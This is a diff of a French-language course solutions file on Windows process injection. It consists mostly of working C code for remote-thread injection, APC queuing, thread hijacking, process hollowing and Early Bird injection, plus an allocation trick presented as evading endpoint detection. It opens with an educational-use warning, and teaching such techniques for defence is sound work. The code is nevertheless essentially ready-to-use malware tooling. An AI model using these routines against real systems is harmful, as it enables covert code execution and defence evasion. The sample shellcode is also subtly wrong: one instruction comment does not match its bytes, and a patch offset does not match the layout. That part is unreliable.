@@ -1,1067 +1,138 @@
-═══════════════════════════════════════════════════════════════════════════
-            MODULE 24 : PROCESS INJECTION - SOLUTIONS
-═══════════════════════════════════════════════════════════════════════════
+⚠️ AVERTISSEMENT STRICT
+Techniques de malware development. Usage éducatif uniquement.
 
-⚠️  AVERTISSEMENT : Ces solutions contiennent du code sensible.
-Usage STRICTEMENT éducatif dans des environnements de test autorisés.
+SOLUTIONS - MODULE 24 : PROCESS INJECTION
 
-═══════════════════════════════════════════════════════════════════════════
+===============================================================================
+SOLUTION 1 : PROCESS HOLLOWING
+===============================================================================
 
-SOLUTION EXERCICE 1 : Process Enumeration
-─────────────────────────────────────────────────────────────────────────────
-
-void enumerate_processes(void) {
-    HANDLE hSnapshot;
-    PROCESSENTRY32 pe32;
-
-    printf("═══════════════════════════════════════════════════════════\n");
-    printf("               ÉNUMÉRATION DES PROCESSUS\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    // Créer un snapshot de tous les processus
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[-] Erreur CreateToolhelp32Snapshot: %lu\n", GetLastError());
-        return;
-    }
-
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    // Récupérer le premier processus
-    if (!Process32First(hSnapshot, &pe32)) {
-        printf("[-] Erreur Process32First: %lu\n", GetLastError());
-        CloseHandle(hSnapshot);
-        return;
-    }
-
-    // En-tête du tableau
-    printf("%-8s %-8s %-8s %-30s\n", "PID", "PPID", "Threads", "Nom");
-    printf("─────────────────────────────────────────────────────────────\n");
-
-    // Parcourir tous les processus
-    int count = 0;
-    do {
-        printf("%-8lu %-8lu %-8lu %-30s\n",
-               pe32.th32ProcessID,           // PID
-               pe32.th32ParentProcessID,     // PPID
-               pe32.cntThreads,              // Nombre de threads
-               pe32.szExeFile);              // Nom du processus
-        count++;
-    } while (Process32Next(hSnapshot, &pe32));
-
-    printf("\n[+] Total: %d processus\n", count);
-
-    CloseHandle(hSnapshot);
-}
-
-Explication :
-- CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) crée un snapshot
-- PROCESSENTRY32 contient toutes les infos d'un processus
-- Process32First/Next pour itérer sur tous les processus
-- Affichage formaté pour lisibilité
-- Fermeture du handle pour éviter les fuites
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 2 : Remote Memory Allocation
-─────────────────────────────────────────────────────────────────────────────
-
-LPVOID allocate_remote_memory(DWORD pid, SIZE_T size, DWORD protection) {
-    HANDLE hProcess = NULL;
-    LPVOID remoteAddr = NULL;
-
-    printf("\n[*] Allocation de %zu bytes dans le processus PID=%lu\n", size, pid);
-
-    // Ouvrir le processus avec les droits nécessaires
-    hProcess = OpenProcess(
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
-        FALSE,
-        pid
-    );
-
-    if (hProcess == NULL) {
-        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
-        printf("    Vérifiez vos privilèges!\n");
-        return NULL;
-    }
-
-    printf("[+] Handle du processus: 0x%p\n", hProcess);
-
-    // Allouer la mémoire dans le processus distant
-    remoteAddr = VirtualAllocEx(
-        hProcess,
-        NULL,                           // Laisser le système choisir l'adresse
-        size,
-        MEM_COMMIT | MEM_RESERVE,
-        protection                      // Protection mémoire
-    );
-
-    if (remoteAddr == NULL) {
-        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
-        CloseHandle(hProcess);
-        return NULL;
-    }
-
-    printf("[+] Mémoire allouée à: 0x%p\n", remoteAddr);
-    printf("[+] Protection: ");
-
-    // Afficher la protection appliquée
-    switch (protection) {
-        case PAGE_READWRITE:
-            printf("RW (Read-Write)\n");
-            break;
-        case PAGE_EXECUTE_READWRITE:
-            printf("RWX (Read-Write-Execute) ⚠️ Détectable!\n");
-            break;
-        case PAGE_EXECUTE_READ:
-            printf("RX (Read-Execute)\n");
-            break;
-        default:
-            printf("0x%lx\n", protection);
-    }
-
-    CloseHandle(hProcess);
-    return remoteAddr;
-}
-
-// Test avec différentes protections
-void test_allocations(DWORD pid) {
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    TEST D'ALLOCATIONS MÉMOIRE DISTANTES\n");
-    printf("═══════════════════════════════════════════════════════════\n");
-
-    // Allocation RW (plus furtive)
-    allocate_remote_memory(pid, 4096, PAGE_READWRITE);
-
-    // Allocation RWX (détectable par EDR)
-    allocate_remote_memory(pid, 4096, PAGE_EXECUTE_READWRITE);
-
-    // Allocation RX (pour code exécutable après écriture)
-    allocate_remote_memory(pid, 4096, PAGE_EXECUTE_READ);
-}
-
-Explication :
-- OpenProcess avec flags minimum nécessaires (principe du moindre privilège)
-- VirtualAllocEx alloue dans l'espace d'adressage du processus distant
-- MEM_COMMIT | MEM_RESERVE réserve et commit la mémoire en une fois
-- Les protections mémoire définissent les droits d'accès
-- PAGE_EXECUTE_READWRITE est détectable par les EDR modernes
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 3 : CreateRemoteThread Injection complète
-─────────────────────────────────────────────────────────────────────────────
-
-// Shellcode x64 : MessageBox "Pwned!" + Clean exit
-unsigned char msgbox_shellcode[] =
-    "\x48\x83\xEC\x28"                          // sub rsp, 0x28
-    "\x48\x31\xC9"                              // xor rcx, rcx (NULL)
-    "\x48\x8D\x15\x1E\x00\x00\x00"              // lea rdx, [message]
-    "\x4C\x8D\x05\x17\x00\x00\x00"              // lea r8, [title]
-    "\x48\x31\xC9"                              // xor r9, r9 (MB_OK)
-    "\x48\xB8"                                  // mov rax, <MessageBoxA addr>
-    "\x00\x00\x00\x00\x00\x00\x00\x00"          // (à patcher dynamiquement)
-    "\xFF\xD0"                                  // call rax
-    "\x48\x83\xC4\x28"                          // add rsp, 0x28
-    "\xC3"                                      // ret
-    "Injected successfully!\0"                   // message
-    "Process Injection\0";                       // title
-
-BOOL inject_createremotethread_complete(DWORD pid) {
-    HANDLE hProcess = NULL;
-    LPVOID remoteBuffer = NULL;
-    HANDLE hThread = NULL;
-    BOOL success = FALSE;
-
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    INJECTION CREATEREMOTETHREAD COMPLÈTE\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    // Étape 1: Ouvrir le processus
-    printf("[1/5] Ouverture du processus PID=%lu...\n", pid);
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == NULL) {
-        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
-        return FALSE;
-    }
-    printf("[+] Handle obtenu: 0x%p\n", hProcess);
-
-    // Étape 2: Allouer la mémoire
-    printf("\n[2/5] Allocation de %zu bytes...\n", sizeof(msgbox_shellcode));
-    remoteBuffer = VirtualAllocEx(
-        hProcess,
-        NULL,
-        sizeof(msgbox_shellcode),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-
-    if (remoteBuffer == NULL) {
-        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] Mémoire allouée à: 0x%p\n", remoteBuffer);
-
-    // Étape 3: Patcher le shellcode avec l'adresse de MessageBoxA
-    printf("\n[3/5] Résolution de MessageBoxA...\n");
-    HMODULE hUser32 = GetModuleHandleA("user32.dll");
-    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
-
-    if (pMessageBoxA == NULL) {
-        printf("[-] Impossible de trouver MessageBoxA\n");
-        goto cleanup;
-    }
-
-    // Patcher l'adresse dans le shellcode (offset 0x11)
-    memcpy(&msgbox_shellcode[0x11], &pMessageBoxA, sizeof(void*));
-    printf("[+] MessageBoxA à: 0x%p\n", pMessageBoxA);
-
-    // Étape 4: Écrire le shellcode
-    printf("\n[4/5] Écriture du shellcode...\n");
-    SIZE_T bytesWritten = 0;
-    if (!WriteProcessMemory(hProcess, remoteBuffer, msgbox_shellcode,
-                           sizeof(msgbox_shellcode), &bytesWritten)) {
-        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] %zu bytes écrits\n", bytesWritten);
-
-    // Étape 5: Créer le thread distant
-    printf("\n[5/5] Création du thread distant...\n");
-    hThread = CreateRemoteThread(
-        hProcess,
-        NULL,
-        0,
-        (LPTHREAD_START_ROUTINE)remoteBuffer,
-        NULL,
-        0,
-        NULL
-    );
-
-    if (hThread == NULL) {
-        printf("[-] Erreur CreateRemoteThread: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] Thread créé! Handle: 0x%p\n", hThread);
-
-    // Attendre l'exécution
-    printf("\n[*] Attente de l'exécution...\n");
-    WaitForSingleObject(hThread, INFINITE);
-
-    printf("[✓] Injection réussie!\n");
-    success = TRUE;
-
-cleanup:
-    // Nettoyage des ressources
-    printf("\n[*] Nettoyage...\n");
-
-    if (remoteBuffer && hProcess) {
-        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        printf("[+] Mémoire libérée\n");
-    }
-
-    if (hThread) {
-        CloseHandle(hThread);
-        printf("[+] Handle thread fermé\n");
-    }
-
-    if (hProcess) {
-        CloseHandle(hProcess);
-        printf("[+] Handle processus fermé\n");
-    }
-
-    return success;
-}
-
-Explication :
-- Le shellcode appelle MessageBoxA avec des paramètres personnalisés
-- L'adresse de MessageBoxA est résolue dynamiquement et patchée dans le shellcode
-- WaitForSingleObject attend que le thread termine (MessageBox fermée)
-- VirtualFreeEx libère la mémoire allouée
-- Tous les handles sont fermés pour éviter les fuites
-
-Points importants :
-- Le shellcode doit respecter la calling convention x64 (rcx, rdx, r8, r9)
-- L'alignement de la stack (rsp) est crucial (16 bytes)
-- Le cleanup est essentiel pour éviter les fuites de ressources
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 4 : QueueUserAPC Multi-Thread
-─────────────────────────────────────────────────────────────────────────────
-
-BOOL inject_queueuserapc_multithread(DWORD pid, void* shellcode, SIZE_T size) {
-    HANDLE hProcess = NULL;
-    LPVOID remoteBuffer = NULL;
-    BOOL success = FALSE;
-    int apc_count = 0;
-
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    INJECTION QUEUEUSERAPC MULTI-THREAD\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    // Ouvrir le processus
-    printf("[1/4] Ouverture du processus PID=%lu...\n", pid);
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == NULL) {
-        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Allouer UNE SEULE FOIS la mémoire pour le shellcode
-    printf("\n[2/4] Allocation de %zu bytes...\n", size);
-    remoteBuffer = VirtualAllocEx(hProcess, NULL, size,
-                                  MEM_COMMIT | MEM_RESERVE,
-                                  PAGE_EXECUTE_READWRITE);
-    if (remoteBuffer == NULL) {
-        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-    printf("[+] Shellcode à: 0x%p\n", remoteBuffer);
-
-    // Écrire le shellcode
-    printf("\n[3/4] Écriture du shellcode...\n");
-    SIZE_T written;
-    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &written)) {
-        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
-        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-    printf("[+] %zu bytes écrits\n", written);
-
-    // Énumérer TOUS les threads et ajouter l'APC à chacun
-    printf("\n[4/4] Ajout d'APC à tous les threads...\n");
-
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[-] Erreur CreateToolhelp32Snapshot\n");
-        goto cleanup;
-    }
-
-    THREADENTRY32 te32;
-    te32.dwSize = sizeof(THREADENTRY32);
-
-    if (Thread32First(hSnapshot, &te32)) {
-        do {
-            // Filtrer uniquement les threads du processus cible
-            if (te32.th32OwnerProcessID == pid) {
-                // Ouvrir le thread
-                HANDLE hThread = OpenThread(
-                    THREAD_SET_CONTEXT,
-                    FALSE,
-                    te32.th32ThreadID
-                );
-
-                if (hThread != NULL) {
-                    // Ajouter l'APC
-                    if (QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0)) {
-                        printf("[+] APC ajouté au thread TID=%lu\n",
-                               te32.th32ThreadID);
-                        apc_count++;
-                    } else {
-                        printf("[-] QueueUserAPC échoué pour TID=%lu: %lu\n",
-                               te32.th32ThreadID, GetLastError());
-                    }
-
-                    CloseHandle(hThread);
-                }
-            }
-        } while (Thread32Next(hSnapshot, &te32));
-    }
-
-    CloseHandle(hSnapshot);
-
-    printf("\n[+] %d APC(s) ajouté(s) avec succès!\n", apc_count);
-    printf("[*] Le shellcode s'exécutera quand un thread sera alertable\n");
-    printf("    (ex: WaitForSingleObjectEx, SleepEx, etc.)\n");
-
-    success = (apc_count > 0);
-
-cleanup:
-    CloseHandle(hProcess);
-    return success;
-}
-
-Explication :
-- Une SEULE allocation pour tous les threads (optimisation)
-- Énumération de TOUS les threads avec Thread32First/Next
-- Filtrage par th32OwnerProcessID pour cibler le bon processus
-- QueueUserAPC sur chaque thread trouvé
-- Compteur d'APCs ajoutés pour statistiques
-
-Points clés :
-- L'APC ne s'exécute que si le thread entre en état "alertable"
-- Plus de threads ciblés = plus de chances d'exécution
-- Le shellcode peut s'exécuter plusieurs fois (une fois par thread)
-- Plus furtif que CreateRemoteThread (pas de nouveau thread créé)
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 5 : Process Hollowing - Partie 1
-─────────────────────────────────────────────────────────────────────────────
-
-BOOL create_suspended_and_read_peb(const char* targetPath) {
+BOOL hollow_process(const char* target_path, LPVOID payload_pe, SIZE_T pe_size) {
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
-    CONTEXT ctx = {0};
-
     si.cb = sizeof(si);
+
+    // Créer processus suspendu
+    CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
+                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    // Obtenir PEB address
+    CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
 
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    PROCESS HOLLOWING - PARTIE 1 : CRÉATION SUSPENDUE\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
+    PVOID peb_addr = (PVOID)ctx.Rdx;  // x64
+    PVOID image_base;
+    ReadProcessMemory(pi.hProcess, (BYTE*)peb_addr + 0x10,
+                     &image_base, sizeof(PVOID), NULL);
 
-    // Étape 1: Créer le processus en mode suspendu
-    printf("[1/4] Création du processus suspendu: %s\n", targetPath);
+    // Unmap original
+    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+    NtUnmap(pi.hProcess, image_base);
 
-    if (!CreateProcessA(
-        targetPath,
-        NULL,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_SUSPENDED,  // ← Mode suspendu!
-        NULL,
-        NULL,
-        &si,
-        &pi
-    )) {
-        printf("[-] Erreur CreateProcess: %lu\n", GetLastError());
-        return FALSE;
+    // Allouer pour nouveau PE
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload_pe;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)payload_pe + dos->e_lfanew);
+
+    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base,
+                                     nt->OptionalHeader.SizeOfImage,
+                                     MEM_COMMIT | MEM_RESERVE,
+                                     PAGE_EXECUTE_READWRITE);
+
+    // Écrire headers
+    WriteProcessMemory(pi.hProcess, new_base, payload_pe,
+                      nt->OptionalHeader.SizeOfHeaders, NULL);
+
+    // Écrire sections
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        WriteProcessMemory(pi.hProcess,
+                          (BYTE*)new_base + section[i].VirtualAddress,
+                          (BYTE*)payload_pe + section[i].PointerToRawData,
+                          section[i].SizeOfRawData, NULL);
     }
 
-    printf("[+] Processus créé - PID: %lu\n", pi.dwProcessId);
-    printf("[+] Thread principal - TID: %lu\n", pi.dwThreadId);
+    // Fixer entry point
+    ctx.Rcx = (DWORD64)((BYTE*)new_base + nt->OptionalHeader.AddressOfEntryPoint);
+    SetThreadContext(pi.hThread, &ctx);
 
-    // Étape 2: Récupérer le contexte du thread principal
-    printf("\n[2/4] Récupération du contexte du thread...\n");
-
-    if (!GetThreadContext(pi.hThread, &ctx)) {
-        printf("[-] Erreur GetThreadContext: %lu\n", GetLastError());
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return FALSE;
-    }
-
-    printf("[+] Contexte récupéré\n");
-
-#ifdef _WIN64
-    printf("    RIP (Instruction Pointer): 0x%llx\n", ctx.Rip);
-    printf("    RDX (PEB address): 0x%llx\n", ctx.Rdx);
-#else
-    printf("    EIP (Instruction Pointer): 0x%lx\n", ctx.Eip);
-    printf("    EBX (PEB address): 0x%lx\n", ctx.Ebx);
-#endif
-
-    // Étape 3: Lire l'adresse de base depuis le PEB
-    printf("\n[3/4] Lecture du PEB...\n");
-
-    PVOID pebAddress;
-    PVOID imageBaseAddress;
-
-#ifdef _WIN64
-    pebAddress = (PVOID)ctx.Rdx;
-    // Sur x64, ImageBaseAddress est à PEB + 0x10
-    SIZE_T bytesRead;
-    if (!ReadProcessMemory(
-        pi.hProcess,
-        (PBYTE)pebAddress + 0x10,
-        &imageBaseAddress,
-        sizeof(PVOID),
-        &bytesRead
-    )) {
-        printf("[-] Erreur lecture PEB: %lu\n", GetLastError());
-        goto cleanup;
-    }
-#else
-    pebAddress = (PVOID)ctx.Ebx;
-    // Sur x86, ImageBaseAddress est à PEB + 0x08
-    SIZE_T bytesRead;
-    if (!ReadProcessMemory(
-        pi.hProcess,
-        (PBYTE)pebAddress + 0x08,
-        &imageBaseAddress,
-        sizeof(PVOID),
-        &bytesRead
-    )) {
-        printf("[-] Erreur lecture PEB: %lu\n", GetLastError());
-        goto cleanup;
-    }
-#endif
-
-    printf("[+] Adresse du PEB: 0x%p\n", pebAddress);
-    printf("[+] Image Base Address: 0x%p\n", imageBaseAddress);
-
-    // Étape 4: Terminer proprement
-    printf("\n[4/4] Terminaison du processus...\n");
-
-cleanup:
-    TerminateProcess(pi.hProcess, 0);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    printf("[+] Processus terminé et nettoyé\n");
+    // Reprendre
+    ResumeThread(pi.hThread);
 
     return TRUE;
 }
 
-// Exemple d'utilisation
-void demo_process_hollowing_part1(void) {
-    // Utiliser un binaire Windows légitime
-    const char* target = "C:\\Windows\\System32\\svchost.exe";
+===============================================================================
+SOLUTION 2 : EARLY BIRD
+===============================================================================
 
-    printf("Test de création suspendue avec: %s\n", target);
-    create_suspended_and_read_peb(target);
+BOOL early_bird_inject(const char* target_path, LPVOID shellcode, SIZE_T size) {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+
+    // Créer suspendu
+    CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
+                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    // Allouer et écrire
+    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, size,
+                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, mem, shellcode, size, NULL);
+
+    // Queue APC avant démarrage
+    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
+
+    // Démarrer processus (APC s'exécutera au démarrage)
+    ResumeThread(pi.hThread);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return TRUE;
 }
 
-Explication :
-- CREATE_SUSPENDED crée le processus mais ne démarre pas l'exécution
-- GetThreadContext récupère les registres du thread principal
-- Sur x64: RDX contient l'adresse du PEB
-- Sur x86: EBX contient l'adresse du PEB
-- ImageBaseAddress est lu depuis le PEB (offset 0x10 sur x64, 0x08 sur x86)
-- TerminateProcess nettoie le processus suspendu
-
-Cette partie pose les bases du Process Hollowing complet :
-1. Création suspendue ✓
-2. Lecture du PEB ✓
-3. Prochaine étape: "Creuser" la mémoire et injecter du code malveillant
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 6 : Thread Hijacking
-─────────────────────────────────────────────────────────────────────────────
-
-BOOL inject_thread_hijacking(DWORD pid, void* shellcode, SIZE_T size) {
-    HANDLE hProcess = NULL;
-    HANDLE hThread = NULL;
-    LPVOID remoteBuffer = NULL;
-    CONTEXT ctx = {0};
-    BOOL success = FALSE;
-
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    INJECTION PAR THREAD HIJACKING\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    // Étape 1: Ouvrir le processus
-    printf("[1/6] Ouverture du processus PID=%lu...\n", pid);
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == NULL) {
-        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Étape 2: Trouver un thread à détourner
-    printf("\n[2/6] Recherche d'un thread à détourner...\n");
-
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    THREADENTRY32 te32;
-    te32.dwSize = sizeof(THREADENTRY32);
-
-    DWORD targetThreadId = 0;
-
-    if (Thread32First(hSnapshot, &te32)) {
-        do {
-            if (te32.th32OwnerProcessID == pid) {
-                targetThreadId = te32.th32ThreadID;
-                printf("[+] Thread trouvé - TID: %lu\n", targetThreadId);
-                break;
-            }
-        } while (Thread32Next(hSnapshot, &te32));
-    }
-    CloseHandle(hSnapshot);
-
-    if (targetThreadId == 0) {
-        printf("[-] Aucun thread trouvé\n");
-        goto cleanup;
-    }
-
-    // Étape 3: Ouvrir et suspendre le thread
-    printf("\n[3/6] Suspension du thread...\n");
-    hThread = OpenThread(
-        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
-        FALSE,
-        targetThreadId
-    );
-
-    if (hThread == NULL) {
-        printf("[-] Erreur OpenThread: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    DWORD suspendCount = SuspendThread(hThread);
-    if (suspendCount == (DWORD)-1) {
-        printf("[-] Erreur SuspendThread: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] Thread suspendu (count: %lu)\n", suspendCount);
-
-    // Étape 4: Allouer et écrire le shellcode
-    printf("\n[4/6] Allocation et écriture du shellcode...\n");
-    remoteBuffer = VirtualAllocEx(hProcess, NULL, size,
-                                  MEM_COMMIT | MEM_RESERVE,
-                                  PAGE_EXECUTE_READWRITE);
-    if (remoteBuffer == NULL) {
-        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    SIZE_T written;
-    WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &written);
-    printf("[+] Shellcode à: 0x%p\n", remoteBuffer);
-
-    // Étape 5: Modifier le contexte du thread
-    printf("\n[5/6] Détournement du contexte...\n");
-
-    ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(hThread, &ctx)) {
-        printf("[-] Erreur GetThreadContext: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-#ifdef _WIN64
-    printf("[*] RIP original: 0x%llx\n", ctx.Rip);
-    ctx.Rip = (DWORD64)remoteBuffer;  // Pointer vers le shellcode
-    printf("[+] RIP modifié: 0x%llx\n", ctx.Rip);
-#else
-    printf("[*] EIP original: 0x%lx\n", ctx.Eip);
-    ctx.Eip = (DWORD)remoteBuffer;
-    printf("[+] EIP modifié: 0x%lx\n", ctx.Eip);
-#endif
-
-    if (!SetThreadContext(hThread, &ctx)) {
-        printf("[-] Erreur SetThreadContext: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    // Étape 6: Reprendre le thread
-    printf("\n[6/6] Reprise du thread...\n");
-    if (ResumeThread(hThread) == (DWORD)-1) {
-        printf("[-] Erreur ResumeThread: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    printf("[+] Thread hijacking réussi!\n");
-    printf("[*] Le shellcode s'exécute maintenant...\n");
-
-    success = TRUE;
-
-cleanup:
-    if (hThread) CloseHandle(hThread);
-    if (hProcess) CloseHandle(hProcess);
-
-    return success;
-}
-
-Explication :
-- SuspendThread fige le thread (empêche son exécution)
-- GetThreadContext récupère l'état des registres
-- Modification de RIP/EIP pour pointer vers le shellcode
-- SetThreadContext applique le nouveau contexte
-- ResumeThread reprend l'exécution → le shellcode s'exécute
-
-ATTENTION :
-- Le shellcode doit restaurer le contexte original pour éviter le crash
-- Le thread ne reviendra PAS à son état original automatiquement
-- Cette technique est très invasive et peut crasher le processus
-
-Shellcode pour Thread Hijacking (doit restaurer le contexte) :
-```asm
-; Sauvegarder les registres
-pushfq
-push rax
-push rbx
-push rcx
-... (tous les registres)
-
-; Votre code malveillant ici
-; ...
-
-; Restaurer les registres
-pop ... (dans l'ordre inverse)
-pop rbx
-pop rax
-popfq
-
-; Retourner à l'adresse originale
-jmp [original_rip]  ; Doit être patché avec l'ancien RIP
-```
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 7 : Stealth Injection - RW → RX
-─────────────────────────────────────────────────────────────────────────────
-
-BOOL inject_stealth_rwx(DWORD pid, void* shellcode, SIZE_T size) {
-    HANDLE hProcess = NULL;
-    LPVOID remoteBuffer = NULL;
-    HANDLE hThread = NULL;
-    BOOL success = FALSE;
-
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    INJECTION FURTIVE : RW → RX (W^X)\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    printf("[*] Cette technique évite les allocations RWX (détectables)\n");
-    printf("[*] Principe: Write XOR Execute (jamais les deux ensemble)\n\n");
-
-    // Ouvrir le processus
-    printf("[1/5] Ouverture du processus PID=%lu...\n", pid);
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == NULL) {
-        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Étape 1: Allouer avec RW uniquement (pas d'exécution!)
-    printf("\n[2/5] Allocation RW (Read-Write SEULEMENT)...\n");
-    remoteBuffer = VirtualAllocEx(
-        hProcess,
-        NULL,
-        size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE  // ← RW uniquement, PAS d'exécution
-    );
-
-    if (remoteBuffer == NULL) {
-        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] Mémoire RW allouée à: 0x%p\n", remoteBuffer);
-
-    // Étape 2: Écrire le shellcode (OK car RW)
-    printf("\n[3/5] Écriture du shellcode dans la région RW...\n");
-    SIZE_T written;
-    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &written)) {
-        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
-        goto cleanup;
-    }
-    printf("[+] %zu bytes écrits\n", written);
-
-    // Étape 3: Changer la protection en RX (Read-Execute)
-    printf("\n[4/5] Changement de protection: RW → RX...\n");
-    DWORD oldProtect;
-    if (!VirtualProtectEx(
-        hProcess,
-        remoteBuffer,
-        size,
-        PAGE_EXECUTE_READ,  // ← RX maintenant (pas d'écriture!)
-        &oldProtect
-    )) {
-        printf("[-] Erreur VirtualProtectEx: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    printf("[+] Protection changée:\n");
-    printf("    Ancienne: RW (0x%lx)\n", oldProtect);
-    printf("    Nouvelle: RX (PAGE_EXECUTE_READ)\n");
-    printf("[✓] Jamais de région RWX créée! (plus furtif)\n");
-
-    // Étape 4: Exécuter le shellcode depuis la région RX
-    printf("\n[5/5] Création du thread (exécution depuis RX)...\n");
-    hThread = CreateRemoteThread(
-        hProcess,
-        NULL,
-        0,
-        (LPTHREAD_START_ROUTINE)remoteBuffer,
-        NULL,
-        0,
-        NULL
-    );
-
-    if (hThread == NULL) {
-        printf("[-] Erreur CreateRemoteThread: %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    printf("[+] Thread créé!\n");
-    WaitForSingleObject(hThread, INFINITE);
-
-    printf("\n[✓] Injection furtive réussie!\n");
-    printf("[*] Aucune région RWX détectée par les EDR\n");
-
-    success = TRUE;
-
-cleanup:
-    if (hThread) CloseHandle(hThread);
-    if (remoteBuffer) VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-    if (hProcess) CloseHandle(hProcess);
-
-    return success;
-}
-
-Explication détaillée :
-
-Flux temporel des permissions :
-1. T0: Allocation RW → Écriture possible, exécution IMPOSSIBLE
-2. T1: Écriture du shellcode (OK car RW)
-3. T2: Changement RW → RX → Exécution possible, écriture IMPOSSIBLE
-4. T3: Exécution du shellcode (OK car RX)
-
-Avantages :
-- JAMAIS de région RWX simultanée
-- Respecte le principe W^X (Write XOR Execute)
-- Plus difficile à détecter pour les EDR basiques
-- Réduit les alertes de sécurité
-
-Détection quand même possible par :
-- EDR avancés surveillant VirtualProtectEx RW→RX
